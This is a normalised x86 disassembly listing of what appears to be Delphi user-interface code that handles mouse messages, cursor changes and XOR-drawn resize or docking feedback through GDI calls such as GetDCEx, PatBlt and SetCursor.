mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_3ab65ec
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_3aba428
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_3abc138
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_3abc2b8
xor edx edx
mov eax edi
call sub_3aba7bc
sub_3abbd30
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_3aba400
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_3a63418
mov edx eax
mov eax ebx
call sub_3aba428
sub_3abbd70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3abbddf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abbde6
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_3abbdec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3abbeec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebx + 0x20 ]
call sub_3abca2c
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_3abbdec
pop ecx
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_3aba18c
mov eax [ ebp - 0xc ]
call sub_3abbd70
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abbef3
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_3abbdec
pop ecx
sub_3abbefc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3abc0a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
lea edx [ eax + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3abc01c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_3ab65ec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0x10 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abc023
mov eax [ ebp - 0x14 ]
call sub_3a64380
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_3abbd70
pop ecx
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_3ab6600
mov esi eax
cmp [ esi + 0x57 ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_3abc023
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
movzx edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
call sub_3abca2c
mov [ ebp - 0xc ] eax
jmp r-xdata
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_3abbdec
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abc0aa
lea eax [ ebp - 0x18 ]
call sub_3a652a0
retn
sub_3abc0b0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_3aba4dc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3aba504
call sub_3abc0b0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3aba4dc
call sub_3abc0b0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_3ab9ee0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_3aba400
mov edx eax
mov eax ebx
call sub_3aba428
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_3aba428
jmp r-xdata
sub_3abc138
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_3abc0b0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_3abc180
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_3aba400
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_3aba428
sub_3abc1b4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_3ab7c38
mov edx eax
mov eax [ rw-data ]
call sub_3abcfe4
mov eax [ ebx + 0x14 ]
call sub_3ab7c38
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_3abc2dc
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_3abc214
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_3abcfe4
mov eax ebx
call sub_3abc2dc
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_3aba428
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_3aba428
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_3abc138
push ebx
push sub_3abc2b8
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_3aba7bc
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_3abc290
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_3ab65ec
test eax eax
jle r-xdata
push ebx
push sub_3abc2b8
xor edx edx
mov eax ebx
call sub_3aba7bc
sub_3abc2dc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_3ab9fa8
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_3ab9fa8
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_3aba02c
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_3aba02c
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_3a89b74
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_3abc3c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_3abc3c8
pop ecx
mov eax ebx
call sub_3aba400
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3aba400
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_3abc3c8
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax ebx
call sub_3aba400
cmp eax esi
jle r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax esi
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_3abc458
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aba400
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_3ab9f60
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_3aba400
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_3abc3c8
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3abc4a8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_3aaf4a0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_3aaf4a0
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_3abc524
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3ab9e60
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_3ab9f18
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_3aba4e8
test eax eax
je r-xdata
mov eax esi
call sub_3ab9ee0
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_3abc2b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_3aba7bc
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_3aba4e8
mov edx [ ebx + 0x20 ]
call sub_3aba43c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_3abc524
pop ecx
sub_3abc5a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_3ab9ebc
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_3ab9ebc
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_3aba4e8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_3abc5a4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_3abc2b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_3aba7bc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_3aba0e4
mov eax edi
call sub_3aba4dc
test eax eax
je r-xdata
mov eax edi
call sub_3aba4e8
mov esi eax
mov eax esi
call sub_3aba400
push eax
mov eax esi
call sub_3ab9f18
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_3aba4dc
call sub_3aba400
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_3aba400
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_3aba428
mov eax esi
call sub_3aba400
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_3aba428
mov eax edi
call sub_3aba4e8
call sub_3aba47c
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_3ab9f18
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_3aba428
mov eax edi
call sub_3aba4dc
call sub_3aba47c
mov bl 0x1
jmp r-xdata
sub_3abc6dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3aba754
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_3a78df4
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3abaf38
test eax eax
je r-xdata
push ebp
call sub_3abc524
pop ecx
push ebp
call sub_3abc5a4
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_3abc4a8
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_3abc764
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi edx
mov edi eax
mov [ esp + 0xc ] 0x0
mov eax [ esi ]
cmp eax 0x204
jg r-xdata
sub eax 0x205
je r-xdata
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
cmp eax 0x201
jg r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
or cl [ r-xdata ]
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0xae2a
je r-xdata
sub eax 0x202
je r-xdata
je r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x32 ] 0x0
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0x20
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
mov [ esp + 0xc ] 0x1
mov ebp [ esi + 0x8 ]
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ ebp + 0x18 ]
lea edx [ ebp + 0x28 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov eax [ esi + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
or cl [ r-xdata ]
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
jmp r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax [ edi + 0x14 ]
call sub_3aaf6c0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ esi + 0x4 ]
mov eax edi
call sub_3abc6dc
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_3ab7c38
cmp eax [ esi + 0x4 ]
jne r-xdata
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x10 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_3ab6680
test eax eax
jle r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_3abaf38
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esp + 0x8 ] 0x12
jne r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acce1c
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
mov [ esp + 0xc ] 0x1
jmp r-xdata
sub_3abc9fc
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov [ esp ] ebx
fild [ esp ]
fdiv [ r-xdata ]
mov [ esp + 0x4 ] esi
fild [ esp + 0x4 ]
fmulp st1
call sub_3a63418
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3abca2c
push ebx
push esi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
test ebx ebx
je r-xdata
xor eax eax
mov [ esp ] esi
fild [ esp ]
mov [ esp + 0x4 ] ebx
fild [ esp + 0x4 ]
fdivp st1
fmul [ r-xdata ]
call sub_3a63418
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3abca90
push ebx
mov eax [ ecx ]
sub eax [ edx + 0x40 ]
add eax eax
sub [ ecx ] eax
mov eax [ ecx + 0x4 ]
sub eax [ edx + 0x44 ]
add eax eax
sub [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov ebx [ edx + 0x48 ]
sub ebx eax
mov eax ebx
add eax eax
sub [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x4 ]
mov edx [ edx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
test eax eax
jle r-xdata
pop ebx
retn
sub [ ecx + 0xc ] eax
sub_3abcad0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test [ ebp - 0x1 ] 0x40
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_3a78df4
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_3abaf38
mov esi eax
test esi esi
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_3a78df4
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_3abaf38
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x12
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_3a78df4
lea ecx [ ebp - 0x2c ]
mov edx esi
mov eax ebx
call sub_3abc1b4
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebx + 0x14 ]
call sub_3ab7c38
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
call sub_3aae0ac
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_3ab09c0
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8f ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
or ecx 0xffffffff
xor edx edx
call sub_3ab02fc
sub_3abcbf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_3ab9fa8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_3ab9fa8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
